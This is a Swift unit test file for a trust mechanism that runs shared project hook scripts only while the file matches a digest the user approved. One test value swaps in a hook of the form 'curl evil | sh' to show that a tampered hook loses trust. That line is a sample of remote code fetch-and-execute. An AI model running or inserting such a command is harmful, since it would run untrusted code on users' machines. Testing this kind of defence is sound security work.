import Foundation
import Testing

@testable import MultishellCore

struct ProjectSettingsTrustTests {
  @Test func sharedHooksRunOnlyWhenTrustedAndOnlyWhileTheFileIsTheOneTrusted() throws {
    let shared = try writtenAndReadBack(
      SharedProjectSettings(postCreateHook: "npm ci", preDeleteHook: "exit 1"))
    let digest = try #require(shared.digest)
    let asked = ProjectSettings()
    #expect(asked.needsTrustDecision(for: shared) && !asked.trustsSharedSettings(of: shared))

    let trusted = ProjectSettings(trustDecisions: [
      TrustDecision(digest: digest, trusted: true)
    ])
    #expect(trusted.trustsSharedSettings(of: shared) && !trusted.needsTrustDecision(for: shared))
    let layered = trusted.layered(over: shared)
    #expect(layered.postCreateHook == "npm ci" && layered.preDeleteHook == "exit 1")
    #expect(layered.preCreateHook == "", "a hook the file does not have stays blank")

    let declined = ProjectSettings(
      trustDecisions: [TrustDecision(digest: digest, trusted: false)])
    #expect(!declined.trustsSharedSettings(of: shared) && !declined.needsTrustDecision(for: shared))
    #expect(declined.layered(over: shared).postCreateHook == "")

    let changed = try writtenAndReadBack(
      SharedProjectSettings(postCreateHook: "curl evil | sh", preDeleteHook: "exit 1"))
    #expect(!trusted.trustsSharedSettings(of: changed), "a changed hook is not in a file trusted")
    #expect(trusted.needsTrustDecision(for: changed), "and is asked about again")

    // The bytes and not the scripts: another key edited is another file,
    // and asks again about hooks that did not change.
    let alsoPrefixed = try writtenAndReadBack(
      SharedProjectSettings(
        branchPrefix: "team/", postCreateHook: "npm ci", preDeleteHook: "exit 1"))
    #expect(alsoPrefixed.trustCoveredText == shared.trustCoveredText)
    #expect(
      !trusted.trustsSharedSettings(of: alsoPrefixed)
        && trusted.needsTrustDecision(for: alsoPrefixed))

    // Settings that came from no file are held against no digest at all.
    let unread = SharedProjectSettings(postCreateHook: "npm ci", preDeleteHook: "exit 1")
    #expect(!trusted.trustsSharedSettings(of: unread) && !trusted.needsTrustDecision(for: unread))
    #expect(trusted.layered(over: unread).postCreateHook == "")
  }

  /// The file is tracked, so it differs between branches, and keeping only the last answer asked
  /// again on every switch.
  @Test func anAnswerIsKeptPerFileSoTwoBranchesHooksAreEachAskedAboutOnce() throws {
    let main = try writtenAndReadBack(SharedProjectSettings(postCreateHook: "npm ci"))
    let feature = try writtenAndReadBack(SharedProjectSettings(postCreateHook: "make bootstrap"))
    var settings = ProjectSettings()
    settings.recordTrustDecision(digest: try #require(main.digest), trusted: true)
    settings.recordTrustDecision(digest: try #require(feature.digest), trusted: false)

    #expect(!settings.needsTrustDecision(for: main), "switching back asks nothing")
    #expect(
      settings.trustsSharedSettings(of: main)
        && settings.layered(over: main).postCreateHook == "npm ci")
    #expect(!settings.needsTrustDecision(for: feature), "and the no is remembered too")
    #expect(!settings.trustsSharedSettings(of: feature))
    #expect(settings.layered(over: feature).postCreateHook == "")

    // An answer given again is the one that stands, and is not stored twice.
    settings.recordTrustDecision(digest: try #require(feature.digest), trusted: true)
    #expect(
      settings.trustDecisions.count == 2 && settings.trustsSharedSettings(of: feature))
  }

  @Test func theOldestAnswerIsDroppedSoAnEditedFileCannotGrowTheStateForever() {
    var settings = ProjectSettings()
    let digests = (0...ProjectSettings.rememberedDecisionLimit).map {
      FileDigest.sha256(of: Data("post-create:\necho \($0)".utf8))
    }
    for digest in digests { settings.recordTrustDecision(digest: digest, trusted: true) }
    #expect(settings.trustDecisions.count == ProjectSettings.rememberedDecisionLimit)
    #expect(
      settings.trustDecisions.first?.digest == digests.last, "the newest answer is kept")
    #expect(
      !settings.trustDecisions.contains { $0.digest == digests[0] },
      "the file longest unanswered-about is the one dropped")
  }
}
